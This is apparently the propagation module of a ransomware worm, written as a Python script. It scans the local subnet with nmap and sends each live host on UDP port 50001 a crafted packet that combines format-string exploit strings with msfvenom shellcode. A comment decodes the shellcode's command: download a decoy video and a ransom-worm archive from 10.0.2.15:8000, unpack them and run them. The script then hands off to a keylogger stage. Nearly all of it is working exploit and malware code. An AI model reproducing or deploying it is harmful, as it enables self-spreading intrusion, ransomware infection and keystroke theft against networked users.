#!/usr/bin/env python
import struct
import socket
import netifaces as ni
import subprocess
import ipaddress

# Function to get the network and subnet mask of the primary interface
def get_interface():
    gateways = ni.gateways()
    default_gateway = gateways['default'][ni.AF_INET][1]
    interface = gateways['default'][ni.AF_INET][1]
    return interface

def get_network(interface):
    addr = ni.ifaddresses(interface)[ni.AF_INET][0]
    network = ipaddress.IPv4Network((addr['addr'], addr['netmask']), strict=False)
    return network

def net_scan(network):
    try:
        print('Scanning Network')
        # Run nmap and pipe its output to awk
        command = f'nmap -oG - {network} | awk \'/Up$/{{print $2}}\''
        output = subprocess.check_output(command, shell=True, universal_newlines=True)

        # Split the output by newlines to get a list of IPs
        ip_addresses = output.strip().split('\n')
        print('Done!', len(ip_addresses), 'Hosts are up')
        return ip_addresses
    except subprocess.CalledProcessError as e:
        return []


def gen_discover_packet(ad_id, os, hn, user, inf, func):
    d  = bytes([0x3e, 0xd1, 0x1])
    d += struct.pack('>I', ad_id)
    d += struct.pack('>I', 0)
    d += bytes([0x2, os])

    # Check if hn is a byte string or a regular string and handle accordingly
    if isinstance(hn, str):
        d += struct.pack('>I', len(hn)) + hn.encode()
    else:
        d += struct.pack('>I', len(hn)) + hn

    # Similar check for user, inf, and func
    if isinstance(user, str):
        d += struct.pack('>I', len(user)) + user.encode()
    else:
        d += struct.pack('>I', len(user)) + user

    d += struct.pack('>I', 0)

    if isinstance(inf, str):
        d += struct.pack('>I', len(inf)) + inf.encode()
    else:
        d += struct.pack('>I', len(inf)) + inf

    d += bytes([0])

    if isinstance(func, str):
        d += struct.pack('>I', len(func)) + func.encode()
    else:
        d += struct.pack('>I', len(func)) + func

    d += bytes([0x2, 0xc3, 0x51])
    return d

#msfvenom -p linux/x64/exec CMD='touch ./youarefucked.txt' -b "\x00\x25\x26" -f python -v shellcode 
# shellcode =  b""
# shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf8\xff\xff\xff\x48"
# shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xba\xb6\xcf"
# shellcode += b"\x88\x34\xa4\x1f\xb6\x48\x31\x58\x27\x48\x2d"
# shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xf2\x0e\xe0\xea\x5d"
# shellcode += b"\xca\x30\xc5\xd2\xb6\x56\xd8\x60\xfb\x4d\xd0"
# shellcode += b"\xd2\x9b\xac\xdc\x6a\xf6\xf7\xaf\xba\xb6\xcf"
# shellcode += b"\xfc\x5b\xd1\x7c\xde\x9a\x98\xe0\xf1\x5b\xd1"
# shellcode += b"\x7e\xc4\xdf\xd0\xba\xeb\x5f\xc1\x7b\x98\xce"
# shellcode += b"\xce\xbb\x88\x62\xf3\x4b\xe8\xd0\x8d\x97\x87"
# shellcode += b"\x31\xa4\x1f\xb6"

#msfvenom -p linux/x64/exec CMD='mkdir ransom-worm; cd ransom-worm; /usr/bin/wget -O cutecats.mp4 '10.0.2.15:8000/send_video'; /usr/bin/xdg-open cutecats.mp4; /usr/bin/wget -O ransom-worm.zip '10.0.2.15:8000/send_ransomworm'; /usr/bin/unzip ransom-worm.zip; python3 -m pip install -r requirements.txt; python3 main.py;' -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xd7\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xc9\xcd\x39"
shellcode += b"\x81\xcf\x7e\x70\xe4\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x81\x75\x16\xe3\xa6"
shellcode += b"\x10\x5f\x97\xa1\xcd\xa0\xd1\x9b\x21\x22\x82"
shellcode += b"\xa1\xe0\x5a\xd5\x91\x2c\x98\xfa\xc8\xcd\x39"
shellcode += b"\xec\xa4\x1a\x19\x96\xe9\xbf\x58\xef\xbc\x11"
shellcode += b"\x1d\xc9\xbe\xa2\x4b\xec\xf4\x5e\x13\x80\xe9"
shellcode += b"\xbf\x58\xef\xbc\x11\x1d\xc9\xbe\xa2\x4b\xec"
shellcode += b"\xf4\x5e\x5f\x91\xba\xbf\x16\xe3\xa6\x10\x5f"
shellcode += b"\x93\xae\xa8\x4d\xa1\xe2\x31\x50\x87\xbc\xb9"
shellcode += b"\x5c\xe2\xae\x0a\x03\xca\xa4\xbd\x0d\xa1\xe8"
shellcode += b"\x4f\x40\xca\xf9\xe3\x0b\xaf\xfe\x4b\x4a\xdc"
shellcode += b"\xf9\xfd\x09\xae\xbc\x1b\x1e\x80\x96\xbb\x50"
shellcode += b"\xe5\xaa\x11\x57\xdf\xe9\xe2\x4c\xf2\xbd\x51"
shellcode += b"\x12\x8d\xa7\xe2\x41\xe5\xa8\x53\x1f\x94\xac"
shellcode += b"\xa3\x19\xe2\xba\x0a\x15\x87\xa8\xb9\x4a\xaf"
shellcode += b"\xa2\x0e\x44\xdf\xe9\xe2\x4c\xf2\xbd\x51\x12"
shellcode += b"\x8d\xa7\xe2\x4e\xe6\xaa\x0a\x50\xc9\x86\xed"
shellcode += b"\x4b\xe0\xa1\x0d\x1f\x89\xe4\xba\x56\xf3\xa2"
shellcode += b"\x50\x0a\x8d\xb9\xed\x1e\xb0\xff\x50\x40\xca"
shellcode += b"\xfb\xe3\x08\xb4\xf5\x46\x40\xd4\xf9\xe2\x4a"
shellcode += b"\xe4\xa1\x1a\x2f\x96\xa8\xa3\x4a\xee\xa2\x09"
shellcode += b"\x1f\x96\xa4\xea\x02\xa1\xe0\x0b\x03\x96\xe6"
shellcode += b"\xaf\x50\xef\xe0\x0b\x1e\x9e\xa0\xbd\x19\xf3"
shellcode += b"\xae\x10\x03\x8b\xa4\xe0\x4e\xee\xbd\x13\x5e"
shellcode += b"\x9e\xa0\xbd\x02\xa1\xbf\x07\x04\x8c\xa6\xa3"
shellcode += b"\x0a\xa1\xe2\x13\x50\x94\xa0\xbd\x19\xe8\xa1"
shellcode += b"\x0d\x04\x85\xa5\xa1\x19\xac\xbd\x5e\x02\x81"
shellcode += b"\xb8\xb8\x50\xf3\xaa\x13\x15\x8a\xbd\xbe\x17"
shellcode += b"\xf5\xb7\x0a\x4b\xc4\xb9\xb4\x4d\xe9\xa0\x10"
shellcode += b"\x43\xc4\xa4\xac\x50\xef\xe1\x0e\x09\xdf\xc9"
shellcode += b"\x9b\x6e\xd5\x91\x14\x4b\xbc\xc6\xc8\x39\x81"
shellcode += b"\xcf\x7e\x70\xe4"


def run():
    next_action = ""
    data = "no_data"
    print("[+] Propagation module activated...")

    try:
        interface = get_interface()
        network = get_network(interface)
        port = 50001
        neighbors = net_scan(network)
        print('Lets attack')
        print('Brute all active Hosts on Port 50001')
        
        for ip in neighbors:
            print(f'IP: {ip}')
            p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(p, (ip, port))
            s.close()
                
    except Exception as e: 
            print(e)
            pass

    next_action = "keylogger"
    return data, next_action
